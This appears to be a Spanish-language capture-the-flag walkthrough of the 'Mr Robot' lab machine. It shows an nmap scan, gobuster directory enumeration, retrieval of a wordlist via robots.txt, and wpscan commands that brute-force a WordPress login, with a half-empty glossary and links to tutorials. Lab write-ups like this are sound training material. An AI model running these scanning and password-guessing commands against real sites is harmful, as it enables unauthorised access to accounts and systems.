# Machine Inclusion

## Informtion MrRobot

1. Primero realizo un escaneo de puerto asi:

```
$ nmap -Pn -sV 10.10.206.202
``` 
2. El resultado es el siguiente:

```
PORT   STATE SERVICE VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
```

## Analisis de vulnerabilidades

- Voy a realizar un scaner con **gobuster**
```
gobuster dir -u http://10.10.206.202/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```
- El resultado que tengo es este
```
/index.php (Status: 301)
/index.html (Status: 200)
/images (Status: 301)
/blog (Status: 301)
/rss (Status: 301)
/sitemap (Status: 200)
/login (Status: 302)
/0 (Status: 301)
/feed (Status: 301)
/video (Status: 301)
/image (Status: 301)
/atom (Status: 301)
/wp-content (Status: 301)
/admin (Status: 301)
/audio (Status: 301)
/intro (Status: 200)
/wp-login (Status: 200)
/wp-login.php (Status: 200)
/css (Status: 301)
/rss2 (Status: 301)
/license (Status: 200)
/license.txt (Status: 200)
/wp-includes (Status: 301)
/js (Status: 301)
/wp-register.php (Status: 301)
/Image (Status: 301)
/wp-rss2.php (Status: 301)
/rdf (Status: 301)
/page1 (Status: 301)
/readme (Status: 200)
/readme.html (Status: 200)
/robots (Status: 200)
/robots.txt (Status: 200)
```
- Voy a esta **URL**
```
http://10.10.206.202/robots.txt
```
- Con esa **URL** ya veo otra ruta, que contiene un diccionario y es esta la Ruta
```
https://10.10.206.202/fsocity.dic
```

## Exploiting

- Vamos a ver cuantas lineas tiene el archivo **fsociety.dic**
```
$ wc -l fsociety.dic
```
- Vemos que hay muchas lineas repetidas y vamos a borrarlas con el comando **uniq** y ordenarla alfabeticamente con el comando **sort** y es asi
```
$ sort fsociety.dic | uniq > dic.txt
```

- Voy hacer un escaneo de **wordpress** con el **wpscan** de esta manera
```
$ wpscan --url http://10.10.206.202 -t 50 -U elliot -P ~/Documents/dic.txt
$ wpscan --url http://10.10.206.202 -t 50 -U ~/Documents/dic.txt -P ~/Documents/dic.txt
```
- Las diferentes opciones son estas
```
--Url: especifica la URL completa que desea escanear (no olvide el ' http ')
-t: la cantidad de hilos simultáneos a usar, elegí 50 en este caso
-U: el nombre de usuario a usar (bueno que enumeramos eso antes, ¿eh?)
-P: el archivo de contraseña para usar
```

## Glosario

- **Nmap -Pn:**  

## Investigación

- **WpScan:** https://www.hackingtutorials.org/web-application-hacking/hack-a-wordpress-website-with-wpscan/

- **WpForce:** https://esgeeks.com/como-hackear-sitio-wordpress-con-wpforce/

## Explotación maquina Inclusion

- http://slayne.github.io/2019/05/19/CTF/

- https://unicornsec.com/home/tryhackme-mr-robot-ctf 
